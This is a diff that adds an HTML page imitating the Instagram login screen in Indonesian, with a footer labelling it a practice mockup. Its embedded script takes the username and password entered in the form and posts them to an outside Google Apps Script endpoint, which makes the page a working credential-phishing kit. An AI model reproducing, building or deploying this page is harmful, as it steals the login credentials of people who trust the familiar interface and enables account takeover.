@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Pacifico&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: #fafafa;
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .phone-section {
+      display: none;
+    }
+    .form-section {
+      max-width: 350px;
+      width: 100%;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 20px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .logo {
+      font-family: 'Pacifico', cursive;
+      font-size: 40px;
+      margin-bottom: 30px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    input[type=text], input[type=password] {
+      border: 1px solid #dbdbdb;
+      background: #fafafa;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 3px;
+    }
+    button {
+      margin-top: 10px;
+      padding: 8px;
+      background: #3897f0;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .or {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      font-size: 13px;
+      color: #8e8e8e;
+    }
+    .or::before, .or::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .or span {
+      margin: 0 18px;
+    }
+    .fb-login {
+      color: #385185;
+      font-weight: 600;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+    .forgot {
+      margin-top: 15px;
+    }
+    .forgot a {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+    }
+    .signup-card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .signup-card a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+    @media (min-width: 900px) {
+      .container {
+        justify-content: space-around;
+      }
+      .phone-section {
+        display: block;
+      }
+      .phone-img {
+        max-width: 400px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="phone-section">
+      <img src="https://www.instagram.com/images/assets_DO_NOT_HARDCODE/lox_brand/landing-2x.png" alt="Phone mockup" class="phone-img">
+    </div>
+
+    <div class="form-section">
+      <div class="card">
+        <div class="logo">Instagram</div>
+        <form id="loginForm" name="loginForm" novalidate>
+          <input type="text" id="username" name="username" placeholder="Nomor telepon, nama pengguna, atau email" required>
+          <input type="password" id="password" name="password" placeholder="Kata sandi" required>
+          <button type="submit">Masuk</button>
+        </form>
+        <div class="or"><span>ATAU</span></div>
+        <button class="fb-login">Masuk dengan Facebook</button>
+        <div class="forgot"><a href="#">Lupa kata sandi?</a></div>
+      </div>
+      <div class="signup-card">
+        Tidak punya akun? <a href="#">Daftar</a>
+      </div>
+      <footer>
+        <p>Instagram clone — hanya mockup latihan</p>
+      </footer>
+    </div>
+  </div>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyu0piLmM56fIoJcvk3iTCXIV059qP5jhaLloRqkd-kR9SjCX8W2aF7eoIsFFJqHdDx/exec'
+  const form = document.forms['loginForm']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+</body>
+</html>
